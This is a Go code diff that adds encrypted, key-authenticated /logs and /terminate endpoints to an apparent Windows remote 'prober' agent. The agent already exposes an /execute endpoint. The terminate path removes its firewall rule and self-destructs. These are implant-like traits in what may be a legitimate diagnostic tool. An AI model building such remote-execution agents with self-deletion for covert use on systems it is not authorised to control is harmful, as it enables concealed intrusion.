@@ -13,6 +13,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 	"syscall"
 	"time"
 	"unsafe"
@@ -23,6 +24,7 @@ var (
 	ttlFlag  = flag.Int("ttl", 3600, "Time to live in seconds")
 	pskFlag  = flag.String("psk", "", "Pre-shared key")
 
+	globalLogPath    string
 	modAdvapi32      = syscall.NewLazyDLL("advapi32.dll")
 	procRtlGenRandom = modAdvapi32.NewProc("SystemFunction036")
 )
@@ -76,6 +78,7 @@ func initLogging() (*os.File, string) {
 	log.SetOutput(multi)
 	flag.CommandLine.SetOutput(multi)
 	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
+	globalLogPath = logFilePath
 	return logFile, logFilePath
 }
 
@@ -208,6 +211,92 @@ func pingHandler(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte("PONG"))
 }
 
+type LogsResponse struct {
+	Logs []string `json:"logs"`
+}
+
+func logsHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, "Failed to read body", http.StatusBadRequest)
+		return
+	}
+
+	key := getAESKey(*pskFlag)
+	_, err = decrypt(body, key)
+	if err != nil {
+		log.Printf("[LOGS] Authentication failed for %s: %v", r.RemoteAddr, err)
+		http.Error(w, "Authentication failed", http.StatusForbidden)
+		return
+	}
+
+	var lines []string
+	if globalLogPath != "" {
+		data, err := os.ReadFile(globalLogPath)
+		if err == nil {
+			allLines := strings.Split(strings.ReplaceAll(string(data), "\r\n", "\n"), "\n")
+			var clean []string
+			for _, l := range allLines {
+				if strings.TrimSpace(l) != "" {
+					clean = append(clean, l)
+				}
+			}
+			start := 0
+			if len(clean) > 100 {
+				start = len(clean) - 100
+			}
+			lines = clean[start:]
+		}
+	}
+
+	resp := LogsResponse{Logs: lines}
+	respJSON, _ := json.Marshal(resp)
+	ciphertext, err := encrypt(respJSON, key)
+	if err != nil {
+		http.Error(w, "Encryption failed", http.StatusInternalServerError)
+		return
+	}
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Write(ciphertext)
+}
+
+func terminateHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, "Failed to read body", http.StatusBadRequest)
+		return
+	}
+
+	key := getAESKey(*pskFlag)
+	_, err = decrypt(body, key)
+	if err != nil {
+		log.Printf("[TERMINATE] Authentication failed for %s: %v", r.RemoteAddr, err)
+		http.Error(w, "Authentication failed", http.StatusForbidden)
+		return
+	}
+
+	log.Printf("[TERMINATE] Terminate command received from %s. Removing firewall and triggering self-destruct...", r.RemoteAddr)
+	w.Header().Set("Content-Type", "application/json")
+	w.Write([]byte(`{"status":"terminating"}`))
+
+	go func() {
+		time.Sleep(500 * time.Millisecond)
+		manageFirewall(*portFlag, false)
+		selfDestruct()
+		os.Exit(0)
+	}()
+}
+
 func manageFirewall(port int, add bool) {
 	var cmd *exec.Cmd
 	if add {
@@ -275,6 +364,8 @@ func main() {
 
 	http.HandleFunc("/execute", executeHandler)
 	http.HandleFunc("/ping", pingHandler)
+	http.HandleFunc("/logs", logsHandler)
+	http.HandleFunc("/terminate", terminateHandler)
 
 	addr := fmt.Sprintf("0.0.0.0:%d", *portFlag)
 	log.Printf("Prober server listening on %s (TTL: %ds)", addr, *ttlFlag)
